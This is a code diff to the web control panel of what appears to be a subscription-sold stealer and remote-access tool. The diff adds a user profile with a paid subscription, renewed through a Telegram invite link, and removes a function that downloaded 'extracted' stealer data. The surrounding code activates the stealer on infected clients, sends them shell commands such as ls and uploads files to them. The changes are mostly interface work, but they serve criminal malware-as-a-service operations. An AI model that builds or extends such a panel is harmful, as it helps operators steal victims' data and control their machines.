@@ -291,7 +291,6 @@
       font-weight: 500;
       cursor: pointer;
       transition: var(--transition);
-      display: flex;
       align-items: center;
       justify-content: center;
     }
@@ -520,6 +519,103 @@
       background: rgba(108, 92, 231, 0.3);
       color: var(--light);
     }
+    /* Profile */
+    .profile-section {
+      margin-top: 1rem;
+      padding: 0.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      cursor: pointer;
+      border-radius: 12px;
+      transition: var(--transition);
+      margin-bottom: 0.5rem;
+    }
+
+    .profile-pic {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      overflow: hidden;
+      border: 1px solid var(--primary);
+    }
+
+    .profile-pic img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .profile-name {
+      font-size: 0.9rem;
+      font-weight: 500;
+    }
+
+    #profileTab .card {
+      max-width: 500px;
+      margin: 20px auto;
+      padding: 20px;
+    }
+
+    .profile-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+      text-align: center;
+    }
+
+    .profile-image-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    #profileDisplayImage {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 2px solid var(--primary);
+      margin: 0 auto;
+    }
+
+    .profile-info {
+      width: 100%;
+    }
+
+    .profile-field {
+      margin-bottom: 15px;
+    }
+
+    .profile-field label {
+      display: block;
+      margin-bottom: 5px;
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    .profile-value {
+      padding: 8px;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 8px;
+      margin: 0 auto;
+      max-width: 300px;
+    }
+
+    .btn-renew {
+      background: var(--success);
+      color: white;
+      border: none;
+      padding: 8px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 5px;
+    }
+
+    .button.btn.btn-success {
+      margin: 1rem;
+    }
 
     /* Animations */
     @keyframes pulse {
@@ -576,14 +672,20 @@
       </div>
       
       <div class="status-bar">
-        <div class="status-item">
+        <div class="status-item">               
           <span>Active Clients:</span>
           <span class="status-value" id="activeClients">0</span>
         </div>
         <div class="status-item">
           <span>Uptime:</span>
           <span class="status-value" id="uptime">0s</span>
+        </div>          
+      </div>
+      <div class="profile-section" onclick="showTab('profile')">
+        <div class="profile-pic">
+          <img id="profileImage" src="./default-profile.png" alt="Profile">
         </div>
+        <div class="profile-name" id="profileUsername">Loading...</div>
       </div>
     </div>
     
@@ -705,6 +807,43 @@
           </div>
           <div id="buildStatus"></div>
         </div>
+          <div id="profileTab" class="tab-content">
+          <div class="card">
+            <div class="card-header">
+              <h2 class="card-title"><i class="fas fa-user"></i> Профиль</h2>
+            </div>
+            
+            <div class="profile-container">
+              <div class="profile-image-container">
+                <img id="profileDisplayImage" src="./default-profile.png" alt="Profile">
+                <input type="file" id="profileUpload" accept="image/*" style="display:none" onchange="uploadProfileImage()">
+              <!--<button class="btn btn-primary" onclick="document.getElementById('profileUpload').click()">
+                  <i class="fas fa-upload"></i> Change photo
+                </button>-->
+              </div>
+              
+              <div class="profile-info">
+                <div class="profile-field">
+                  <label>Name:</label>
+                  <div class="profile-value" id="profileUsernameDisplay">Loading...</div>
+                </div>
+                
+                <div class="profile-field">
+                  <label>Subscription status:</label>
+                  <div class="profile-value" id="profileSubscription">Loading...</div>
+                  <button class="btn btn-success" onclick="renewSubscription()">
+                    <i class="fas fa-sync-alt"></i> Продлить
+                  </button>
+                </div>
+                
+                <div class="profile-field">
+                  <label>Account created:</label>
+                  <div class="profile-value" id="profileCreated">Loading...</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
   </div>
@@ -732,6 +871,7 @@
       };
       loadClients();
       showTab('cmd');
+      loadProfile();
       updateUptime();
       
       // Theme toggle event
@@ -883,29 +1023,11 @@
         })
       })
       .then(() => {
-        status.textContent = "Stealer activated successfully!";
+        status.textContent = "Stealer activated successfully!     https://t.me/+85LIvpGqyhY2NTZi";
       })
       .catch(err => {
         status.textContent = "Error: " + err.message;
       });
-    }
-    
-    // Download stealer data
-    function downloadStealerData() {
-      const data = document.getElementById("stealerData").textContent;
-      const blob = new Blob([data], { type: 'text/plain' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      
-      a.href = url;
-      a.download = `extracted_data_${new Date().toISOString().slice(0, 10)}.txt`;
-      document.body.appendChild(a);
-      a.click();
-      
-      setTimeout(() => {
-        document.body.removeChild(a);
-        window.URL.revokeObjectURL(url);
-      }, 100);
     }
     
     // Send ls command
@@ -990,6 +1112,82 @@
       });
     }
 
+    function loadProfile() {
+      fetch('/profile')
+        .then(res => res.json())
+        .then(data => {
+          const username = data.username || 'Guest';
+          document.getElementById('headerUsername').textContent = username;
+          document.getElementById('profileUsername').textContent = username;
+          document.getElementById('profileUsernameDisplay').textContent = username;
+          
+          let subscriptionText;
+          if (data.subscriptionEnd > 0) {
+            subscriptionText = `Подписка: ${data.subscriptionEnd} дней`;
+          } else {
+            subscriptionText = 'Нет подписки';
+          }
+          
+          document.getElementById('headerSubscription').textContent = subscriptionText;
+          document.getElementById('subscriptionDate').textContent = subscriptionText;
+          document.getElementById('profileSubscription').textContent = subscriptionText;
+          
+          const imgUrl = data.image ? 
+            `${data.image}?t=${new Date().getTime()}` : 
+            './default-profile.png';
+          
+          document.getElementById('headerProfileImage').src = imgUrl;
+          document.getElementById('profileImage').src = imgUrl;
+          document.getElementById('profileDisplayImage').src = imgUrl;
+          
+          if (data.created) {
+            document.getElementById('profileCreated').textContent = 
+              `Аккаунт создан: ${new Date(data.created).toLocaleDateString()}`;
+          }
+        })
+        .catch(err => {
+          console.error('Profile load error:', err);
+          document.getElementById('headerUsername').textContent = 'Guest';
+          document.getElementById('profileUsername').textContent = 'Guest';
+        });
+    }
+
+    function renewSubscription() {
+      // Здесь можно добавить логику для продления подписки
+      window.open('https://t.me/+85LIvpGqyhY2NTZi', '_blank');
+    }
+
+    function uploadProfileImage() {
+      const file = document.getElementById('profileUpload').files[0];
+      if (!file) return;
+      
+      if (file.size > 10 * 1024 * 1024) {
+        alert('Image must be less than 10MB');
+        return;
+      }
+      
+      const formData = new FormData();
+      formData.append('image', file);
+      
+      fetch('/upload_profile', {
+        method: 'POST',
+        body: formData
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.success) {
+          const cacheBuster = '?t=' + new Date().getTime();
+          document.getElementById('profileImage').src = data.url + cacheBuster;
+          document.getElementById('profileDisplayImage').src = data.url + cacheBuster;
+        } else {
+          alert('Upload failed: ' + (data.error || 'unknown error'));
+        }
+      })
+      .catch(err => {
+        console.error('Upload error:', err);
+        alert('Upload failed');
+      });
+    }
     
     // Upload file
     function upload() {
